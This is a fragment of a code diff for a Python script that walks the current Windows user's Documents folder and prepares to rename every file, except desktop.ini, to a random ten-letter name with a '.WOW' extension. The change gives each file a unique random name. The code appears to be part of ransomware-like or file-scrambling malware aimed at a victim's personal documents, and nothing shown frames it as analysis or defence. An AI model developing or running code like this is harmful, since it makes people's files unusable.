@@ -10,10 +10,10 @@ import random
 import string
 
 letters = string.ascii_lowercase
-ran_name = ''.join(random.choice(letters) for i in range(10))
 usr = os.getlogin()
 for r,d, files in os.walk("C:\\Users\\"+usr+"\\Documents"):
     for file in files:
+        ran_name = ''.join(random.choice(letters) for i in range(10))
         lfile = os.path.join(r, file)
         lname = os.path.join(r, ran_name + ".WOW")
         if not "desktop.ini" in lfile:
